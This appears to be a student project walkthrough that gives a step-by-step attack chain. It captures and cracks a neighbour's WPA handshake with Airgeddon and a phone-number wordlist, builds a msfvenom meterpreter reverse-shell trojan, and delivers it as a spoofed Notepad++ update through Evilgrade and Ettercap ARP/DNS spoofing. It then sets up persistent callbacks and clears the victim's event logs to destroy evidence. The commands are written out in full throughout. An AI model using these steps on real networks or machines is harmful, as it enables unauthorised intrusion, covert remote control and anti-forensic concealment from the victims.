# Wireless Hacking
Wireless Hacking will be more efficient if we know the attack flow of the target. In this project, the wireless hacking tools that will be using are Airgeddon and Evilgrade.

Airgeddon is written in bash and multi-use for Linux system to audit wireless networks and developed by V1s1t0rsh3r3. Evilgrade is a modular framework that allows the user to take advantage of poor upgrade implementations by injecting fake updates.

## Attacking Procedures
### 1. Reconnaissance and Scanning
![image](https://user-images.githubusercontent.com/86700132/131206889-f4953471-c343-4b1e-9ea3-241425c013c7.png)


From airgeddon main menu terminal window, the first step we need to do is capture some handshake. Choose option 5 and the script will move to handshake menu.


![image](https://user-images.githubusercontent.com/86700132/131206911-a8398b36-7861-4160-bc23-e37a6b40d2f7.png)


The next step we need to perform is to scan on all available wireless networks detected by wlan0mon and select the targeted network by choosing option 4. After capture some network, press CTRL+C to stop the scan.


![image](https://user-images.githubusercontent.com/86700132/131206918-ecf2cf17-6540-4658-8a9c-f3dc2a0d1178.png)

![image](https://user-images.githubusercontent.com/86700132/131206925-151dd49c-2a90-4cf3-bb23-cd789b5d46f7.png)


Select the target network. In our case, we choose No. 17 which is Lenovo P70-A.


![image](https://user-images.githubusercontent.com/86700132/131206930-5c15c7e2-cff6-4a1c-806b-76b455ac52dc.png)


Next, choose option 5 capture the handshake. In our case, we are going to capture network for Lenovo P70-A.


![image](https://user-images.githubusercontent.com/86700132/131206939-1b8c4e05-d7df-4f5b-9261-6e86fe52deca.png)


In this step, select the deauth / disassoc amok mdk3 attack which is option 1 and wait around 20 seconds to forcefully disconnect a client from the access point and get the handshake.


![image](https://user-images.githubusercontent.com/86700132/131206952-764000be-7304-4442-bf4f-3ec825de8aa2.png)

![image](https://user-images.githubusercontent.com/86700132/131206956-1252acd9-6cbc-4bd4-8d8e-41d210fa464a.png)


The script will ask whether you get the handshake or not, insert y and press enter if you successful get the handshake which we will using it to perform wireless attack. Last, return to main menu and prepare for gaining access.


![image](https://user-images.githubusercontent.com/86700132/131206962-3c22884b-1489-4454-906f-a8e4608d816e.png)


### 2. Gaining Access
#### 1st STEP : Password cracking by using Airgeddon 
Once we receive the network password hash from reconnaissance and scanning, we are going to crack that hash so that we can get the network password without identify the private key. In this case, we use a dictionary password cracking attack. We create a dictionary file that consists of list of phone numbers manually, since we know that the network password is phone number of our neighbor. Then we crack the network password by using the dictionary file.

Open a new terminal and use crush to create a dictionary file.

Command:
```
crunch 10 10 0123456789 -t 016%%%%%% -o /root/Desktop/phonenumber.txt
```
![image](https://user-images.githubusercontent.com/86700132/131207133-f433390d-7449-4a58-9f45-0337156cbe1b.png)


Come back to airgeddon terminal window. From the main menu choose option 6, which is offline WPA/WPA2 decrypt menu. 


![image](https://user-images.githubusercontent.com/86700132/131207141-8246a62b-edd1-467d-b599-39f6cece2dfd.png)


Then choose dictionary attack against capture file and enter the path of wordlists file.
```
/root/Desktop/phonenumber.txt
```
![image](https://user-images.githubusercontent.com/86700132/131207161-7395ba40-5cb9-403e-9852-6f8337f762ae.png)


The terminal will start to run the dictionary file.


![image](https://user-images.githubusercontent.com/86700132/131207165-19369f28-5f5a-4bfc-bf38-ea50a721e974.png)


The terminal will display word “KEY FOUND!” once the key is detected.


![image](https://user-images.githubusercontent.com/86700132/131207179-8ab5e9ac-1fe0-4d0a-b75f-120ff19e0d12.png)


Finally, press enter to store the record in the default path.


![image](https://user-images.githubusercontent.com/86700132/131207190-b2ff93a9-6a86-4d88-a31a-e4665302e8e8.png)


#### 2nd STEP : Create a reverse shell trojan using Metasploit
In this step, we create a reverse shell trojan so that targeted machine will listen to kali linux meterpreter shell once it is executed.

Now create a reverse shell trojan called "shell.exe" by using code below as figure below. This trojan will make the targeted machine listen to kali linux meterpreter shell. This trojan is created and located at root directory in kali linux.
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.144.142 LPORT=4444 -f exe > shell.exe
```
![image](https://user-images.githubusercontent.com/86700132/131207201-ac06fef4-3981-457d-bdc2-9cf5308fb474.png)


#### 3rd STEP : create a notepadplus module and spoof notepad++ website using Evilgrade
In this step, we create a notepadplus module and spoof notepad++ website. This module can be retrieved from spoof website. Once victim run his/her notepad++.exe and click yes button for updating their notepad++, their machine will request update module, which is notepadplus module from our spoof website. Then their machine starts to download the update received from notepadplus module and at the same time, the notepadplus also send the trojan to targeted machine and make it execute the trojan so that targeted machine listen to kali linux meterpreter shell.

Start the Evilgrade by typing the following commands:
```
root@kali:~# cd evilgrade
root@kali:~# ./evilgrade
```
![image](https://user-images.githubusercontent.com/86700132/131207216-25e83183-a834-4a62-8710-a3ff08dfa42b.png)


If Evilgrade run successfully, then it will load the modules as shown in diagram below:


![image](https://user-images.githubusercontent.com/86700132/131207221-aa80c012-b196-4678-9512-8e54a071834d.png)


After Evilgrade is intialized, type configure notepadplus to create a notepadplus module and spoof notepad++ website.

Type command below:
```
configure notepadplus
```

Then, we inject the malicious code into the notepadplus module. This malicious code will execute the trojan we set before when victim is updating their notepad++.
```
set agent '["<%OUT%>/root/shell.exe<%OUT%>"]'
```
![image](https://user-images.githubusercontent.com/86700132/131207260-e1b83cfb-0c10-406d-bf81-63f4f7b38029.png)


To ensure malicious code is properly injected, type command below to view the module and spoof website properties.
```
show options
```
![image](https://user-images.githubusercontent.com/86700132/131207270-454c4d86-05fd-4297-ab91-d7c69260376d.png)


#### 4th STEP : build a meterpreter shell in the kali linux using Metasploit
In this step, we create a reverse shell using Metasploit to wait for the targeted machine to connect kali linux meterpreter shell.

open Metasploit 
```
msf > use exploit/multi/handler
msf exploit(handler) > set LHOST 192.168.144.142
msf exploit(handler) > set LPORT 4444
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
```
![image](https://user-images.githubusercontent.com/86700132/131207286-a0aec130-bb91-43ef-8ece-1836f55517bd.png)


To ensure the payload settings are properly set, type :
```
show options
```
![image](https://user-images.githubusercontent.com/86700132/131207293-8b71ddb3-914d-4054-8e9f-a977d90dd627.png)


Once the reverse shell is set properly, type command below to execute the reverse shell.
```
exploit
```
![image](https://user-images.githubusercontent.com/86700132/131207308-298e3fb1-0573-430a-bd55-16c6b66897c6.png)


Once payload is set, go back to Evilgrade to execute the notepadplus module by using command below:
```
start
```
![image](https://user-images.githubusercontent.com/86700132/131207320-5bc29496-1783-466b-9c0e-622dd9ff3103.png)


#### 5th STEP: perform DNS spoofing attack using EtterCap
Now, we open the ettercap.dns file to add the spoof notepad++ website DNS (domain name server). To check the location of etter.dns type:
```
locate etter.dns
```
![image](https://user-images.githubusercontent.com/86700132/131207332-86f437b4-72fc-4d2c-bf7f-49283aa24369.png)


Then, type:
```
cd/etc/ettercap
```
![image](https://user-images.githubusercontent.com/86700132/131207344-e8f3d753-154e-4554-b326-fa0679a65885.png)


After that, to enter the etter.dns, type:
```
nano etter.dns
```
![image](https://user-images.githubusercontent.com/86700132/131207364-574bd256-e291-4f3f-a3b3-be01be51133c.png)


Then scroll down the file until you see the " microsoft suck ; ) " sentence. That is the place we need to configure spoof DNS server. Type command below as the figure below to set the spoof DNS server. 
```
notepad-plus.sourceforge.net A 192.168.144.142
```
![image](https://user-images.githubusercontent.com/86700132/131207390-573f8acc-90ac-4653-9793-f3706cb6d087.png)


To make sure the targeted machine is still havent disconnect from current network, type the command below:
```
nmap –sn 192.168.144.0-255
```
![image](https://user-images.githubusercontent.com/86700132/131207417-c69ccc84-64ca-4392-bd25-819d440d432e.png)


Now type the command below to run the DNS spoofing attack toward targeted machine using EtterCap. -T means text mode. -Q means super quite mode. -M means perform a man-in-the-middle attack. -P means plugin. 
```
ettercap -T -Q -M arp -P dns_spoof //192.168.144.148//
```
![image](https://user-images.githubusercontent.com/86700132/131207435-16b6518a-d713-4a64-804f-1e827acdb2f5.png)


The diagram above shows that DNS spoofing attack is performing. This attack scans every host available in current network, and then perform ARP poisoning attack to victim machine. 

Now our work is done, we just wait for the victim to run the notepad++ application.


#### 6th STEP : waiting targeted machine to listen kali linux meterpreter shell
We will wait for the victim to run the notepad++ application. If the victim opens it, it will ask victim to update the notepad++. Then if the victim clicks yes for 2 times, the malicious code injected in notepadplus module will be executed and makes targeted machine to listen to kali linux meterpreter shell.

Let's jump to the targeted machine interface. When victim open the notepad++ executable. The executable will ask victim to update their notepad++. 


![image](https://user-images.githubusercontent.com/86700132/131207451-a3d4c6ae-c243-4351-9090-161d28edfc85.png)

The victim click yes button.


![image](https://user-images.githubusercontent.com/86700132/131207462-da319dd6-0ea9-48fa-980e-33cb27bac870.png)

Victim click yes button again.

Back to the kali linux, diagram below show that the IP address and MAC address of ARP poisoning targeted machine and perform the DNS spoofing attack towards it.


![image](https://user-images.githubusercontent.com/86700132/131207471-14d2cb5d-7a35-4212-a147-88d4345e24a6.png)


The diagrams below show that the targeted machine establishes the spoof notepad++ website connection and asks for update package to that website. Then the notepadplus module recieves the requests from spoof notepad++ website and returns .php file required and executes malicious code.


![image](https://user-images.githubusercontent.com/86700132/131207475-d0f99bca-092e-4797-8ab2-f27bb4bdcffe.png)

![image](https://user-images.githubusercontent.com/86700132/131207479-f9b378a6-6d2b-4949-80f7-1736b053b42a.png)


Back to the Metasploit, the diagram below shows that the targeted machine is listening to kali linux meterpreter shell.


![image](https://user-images.githubusercontent.com/86700132/131207484-2122cd11-3e3d-400e-921a-103b7b4f5bcd.png)


### 3. Maintaining Access
In this stage, we have finally access to the targeted machine. We configure the persistence in meterpreter shell to have a permanent automatic connection to targeted machine in targeted machine background. Once we set the persistence into the targeted machine, we can access the targeted machine by just waiting victim to connect the port of our attack machine. Then, if targeted machine disconnects to our port, we can just type command "exploit" and wait for targeted machine connect to port of our attack machine again. 

Now, we type the following command to configure a persistence meterpreter session. This persistence meterpreter session will wait until victim turn on his/her targeted machine and try to connect back to meterpreter shell for every 5 seconds to out attack machine on port 443.
```
run persistence –U –i 5 –p 443 –r 192.168.144.142
```
-U  Automatically start the agent when the User logs on

-i	The interval in seconds between each connection attempt

-p	The port on which the system running Metasploit is listening

-r	The IP of the system running Metasploit listening for the connect back

![image](https://user-images.githubusercontent.com/86700132/131207520-9599b311-228f-440c-95e8-8b735b8bb59c.png)


Let's try whether we can permanently connect to targeted machine. Type command:
```
exit
```
![image](https://user-images.githubusercontent.com/86700132/131207531-71e26f84-3947-40f0-8ee4-9a3aa033c1aa.png)


Then type command:
```
msf exploit(handler) > use multi/handler
msf exploit(handler) > set lhost 192.168.144.142
msf exploit(handler) > set lport 443
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf exploit(handler) > exploit
```
![image](https://user-images.githubusercontent.com/86700132/131207542-91508069-8707-434b-a9e3-aa36118def88.png)


Diagram above shows that we can connect to targeted machine again. This prove that we can permanently connect to targeted machine if the targeted machine is log on.


### 4. Clearing Track
In the last stage, of course, we need to clear the trace of our attack to targeted machine. This is very important because once we clear our trace, victim do not know his/her machine is being attack and once he/she detect our attack, he/she do not have evidences to prove it.

We type command below to clear the event logs of targeted machine so that our trace will be clear also. However, this will force the application executing in targeted machine to close too. 
```
clearev
```
![image](https://user-images.githubusercontent.com/86700132/131207555-72f542c4-f2c3-4129-a567-cc36ddcf8e2c.png)














